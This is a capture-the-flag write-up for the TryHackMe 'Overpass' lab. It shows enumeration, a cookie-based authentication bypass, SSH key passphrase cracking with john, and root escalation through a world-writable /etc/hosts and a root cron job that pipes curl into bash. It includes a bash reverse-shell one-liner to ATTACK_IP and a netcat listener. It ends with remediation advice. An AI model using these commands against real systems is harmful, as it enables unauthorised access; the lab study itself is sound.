# Try Hack Me - Overpass

**Categories:** Security, OWASP top 10, Cron  
**Difficulty:** Easy  

All of the commands used in this guide use the exported variable $IP (`export IP=10.10.31.26`) in place of the target machine's IP address.

## 1: Enumeration : nmap

Having launched the machine, we perform a basic service enumeration scan with nmap :

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -oN nmap.out $IP
```
The scan shows two open ports : 22 (OpenSSH 7.6p1) and 80 (Golang net/http server) :

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
```

## 2: Web enumeration : gobuster

We run a `gobuster` scan with the dirbuser medium wordlist to provide more information on the application running on 80 :

```console
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u $IP -o gobuster.out 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.31.26
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/05 21:59:42 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
/admin                (Status: 301) [Size: 42] [--> /admin/]
...snip...
```

There are two clear points of interest here : `/downloads/`, which hosts compiled binaries and source code of the Overpass password manager, and `/admin/`, which provides a login page for the admin panel.

## 3: /downloads/ - code review

curling the `/downloads/src/` route reveals a `buildscript.sh` script (good information, but not useful here) and the Overpass application source code, written in Go. Downloading the source code (`curl $IP/downloads/src/overpass.go > overpass.go`) shows that the application is fairly simple. 2 features worth noting are the weakness of the "encryption" scheme (ROT47) :

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
    var result [] string
        for i := range input[:len(input)] {
                j := int(input[i])
                if (j >= 33) && (j <= 126) {
                        result = append(result, string(rune(33+((j+14)%94))))
                } else {
                        result = append(result, string(input[i]))
                
        }
        return strings.Join(result, "")
}
```

and the default location of the Overpass password file : 

```go
func main() {credsPath, err := homedir.Expand("~/.overpass")
        if err != nil {fmt.Println("Error finding home path:", err.Error())
        }
        //Load credentials
        passlist, status := loadCredsFromFile(credsPath)
        ...snip...
```

If any of the users of the machine are using the overpass application to "protect" their passwords, we now have the location and encryption scheme of the file - but the `/downloads/` page does not provide a direct path to a foothold on the machine.

## 4: /admin/ - broken authentication

The `/admin/` page provides a basic username:password login page (the hint for the machine's user flag specifically requests that we don't try to brute force this panel, so we won't). Further inspection of the page reveals that the POST request generated by the login form is handled by `/login.js`, and more specifically by the `login()` function : 

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
} 
```
The function extracts the values from the input elements, POSTs them to `/api/login`, and handles the response : if the response is the string 'Incorrect credentials', the login fails, else a cookie `SessionToken` is set with the response content. Having already seen the group's approach to encryption, we might want to gamble here that the server only checks for the existence of the `SessionToken` cookie rather than its value. To test this, we can curl the `/admin/` route using `--cookie` to set the `SessionToken` cookie to an arbitrary value :

```console
┌──(kali㉿kali)-[~]
└─$ curl --cookie "SessionToken=youdontactuallycheckthisvaluedoyou" $IP/admin/
<!DOCTYPE html>

...snip...

<body>
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <h1 class="pageHeading content">Welcome to the Overpass Administrator area</h1>

...snip...
```

Our intuition was right, and we have access to the `/admin/` page.

## 5: Foothold : private RSA key, john

The admin page contains an encrypted private RSA key for a user james who keeps forgetting his password :

```html
...snip...
<p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
<p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
...snip...
```

We copy-paste the private key to the attack machine, saving it as `id_rsa`. We then use `ssh2john` module of john to prepare the private key for cracking, saving the result as `id_rsa.john` (you may need the [jumbo version of john](https://github.com/openwall/john) for the ssh2john module). We then use john with the rockyou wordlist to crack the key's passphrase:

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ /usr/share/john/ssh2john.py id_rsa > id_rsa.john

┌──(kali㉿kali)-[/tmp/dead]
└─$ john --wordlist=rockyou.txt --format=SSH id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
JAMES_PASSWORD          (id_rsa)
1g 0:00:00:03 DONE (2021-09-05 22:40) 0.2617g/s 3754Kp/s 3754Kc/s 3754KC/sa6_123..*7¡Vamos!
Session completed
```
john successfully finds the passphrase for the key (replaced here with JAMES_PASSWORD). We can now use the key to connect to the machine, making sure to set the correct permissions on the `id_rsa` file: 

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[/tmp/dead]
└─$ ssh james@$IP -i id_rsa
The authenticity of host '10.10.31.26 (10.10.31.26)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.31.26' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

...snip...

james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```
The user flag is at /home/james/user.txt.

## 6: Privesc : cronjob, hosts

We're going to skip the basic privesc go-tos (user discovery, service discovery, process discovery, cronjobs, SUIDs, linpeas etc.) to follow the "narrative" of the box, which gives us two more paths to check : the `.overpass` file location discovered in the application source code, and the `todo.txt` file at `/home/james`.

We don't get much luck out of the `.overpass` file at `/home/james` - it contains his ROT47 encoded password, but he is not included in the box's sudoers list.

The `todo.txt` file includes a reference to an automated build script that is failing to update the builds on the website (presumably the `buildscript.sh` discovered at `/downloads/`). If the build script is expected to update the builds on the site, it is safe to assume that it is running on the box, and if it is automated, we can also assume that it is being run by a cronjob. Sure enough, inspecting `/etc/crontab` reveals the job:

```console
james@overpass-prod:~$ cat /etc/crontab
...snip...
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The job uses curl to download the script from `overpass.thm/downloads/src/buildscript.sh` and pipes it directly into bash for execution. The use of the domain should stand out here - if we can modify `/etc/hosts` or the local DNS cache to resolve requests to `overpass.thm` to our machine's IP, we can host an arbitrary script that will be executed on the box as root. Let's check if the `/etc/hosts` is writeable for james :

```console
james@overpass-prod:~$ ll /etc/hosts && cat $_
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

This is not good. We can now prepare the exploit. First, we replace the `overpass.thm` entry in `/etc/hosts` with the IP of the attack machine (omitted here) :

```console
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
ATTACK_IP overpass.thm
...snip...
```

We then create a bash reverse shell at `./downloads/src/buildscript.sh` on the attack machine :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ mkdir -p ./downloads/src && cd $_

┌──(kali㉿kali)-[/tmp/dead/downloads/src]
└─$ echo "bash -i >& /dev/tcp/ATTACK_IP/5555 0>&1" > buildscript.sh
```

and set up a http server to serve requests for `buildscript.sh` from the target machine and a netcat listener :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
```

After a minute or so, we should see a request for the `buildscript.sh` on the server, and the incoming reverse shell connection on netcat :

```console
┌──(kali㉿kali)-[/tmp/dead]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.31.26 - - [05/Sep/2021 23:20:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [NO_MATE_NOT_HERE_EITHER] from (UNKNOWN) [10.10.31.26] 60674
bash: cannot set terminal process group (2800): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# id 
id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.

## Summary and Solutions

So what went wrong here ? Everything, more or less. 

1. The "SessionToken" cookie is not correctly managed server side ; any value provides access to the admin panel.
2. Access to the admin panel provides access to a private RSA key with a weak passphrase (!?!).
3. /etc/hosts is globally writable, allowing malicious users to systematically redirect traffic for trusted domains.
4. The cronjob responsable for updating the builds runs as root, downloading a script from a domain defined in the writable `/etc/hosts` and piping it directly into bash.

And what could have been done to prevent it?
1. [OWASP provides the basic guide to effective server side session management](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication) ; the application should at least (at the very least) check the value and validity of the "SessionToken" cookie.
2. Don't publish private keys on your website. Easy!
3. Write access to `/etc/hosts` should only be available to root (644 - root read and write, all other users read). A writable `/etc/hosts` file effectively removes the concept of a "trusted domain" and is the root cause of the privesc vulnerability.
4. The principle of least privilege should be used when scoping permissions for cronjobs. In this case, the `buildscript.sh` script only requires execute access to the Go binary and write access to the web application's root folder - the job should be run by a user with appropriately scoped privileges.